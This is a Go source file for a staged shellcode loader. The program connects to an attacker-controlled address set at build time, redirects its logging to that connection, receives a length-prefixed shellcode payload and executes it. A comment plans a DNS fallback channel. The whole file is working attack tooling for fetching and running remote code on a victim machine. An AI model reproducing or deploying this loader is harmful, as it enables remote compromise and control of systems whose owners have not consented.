package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
)

var (
	// set during compilation/linking via -X ldflag
	address string
)

func receiveShellcode(con net.Conn) ([]byte, error) {
	sizeBuffer := make([]byte, 4)

	// read shellcode size
	_, err := con.Read(sizeBuffer)
	if err != nil {
		return nil, fmt.Errorf("could not receive shellcode size: %v", err)
	}
	shellcodeSize := binary.LittleEndian.Uint32(sizeBuffer[:])
	fmt.Printf("shellcode size: %d\n", shellcodeSize)

	shellcodeBuffer := make([]byte, shellcodeSize)
	n, err := io.ReadFull(con, shellcodeBuffer)
	if err != nil {
		return nil, fmt.Errorf("could not receive shellcode: %v", err)
	}
	// this is probably unneccessary with io.ReadFull
	if n != int(shellcodeSize) {
		return nil, fmt.Errorf("read wrong size %d should be %d", n, shellcodeSize)
	}

	return shellcodeBuffer, nil
}

func main() {
	con, err := net.Dial("tcp", address)
	if err != nil {
		fmt.Printf("could not connect to %s: %s\n", address, err)
		return
		// TODO: report back through another channel (DNS, ...)
	}
	log.SetOutput(con)

	shcode, err := receiveShellcode(con)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Printf("received %d bytes of shellcode\n", len(shcode))
	err = execShellcode(shcode)
	if err != nil {
		fmt.Printf("shellcode execution failed: %v", err)
	}
}
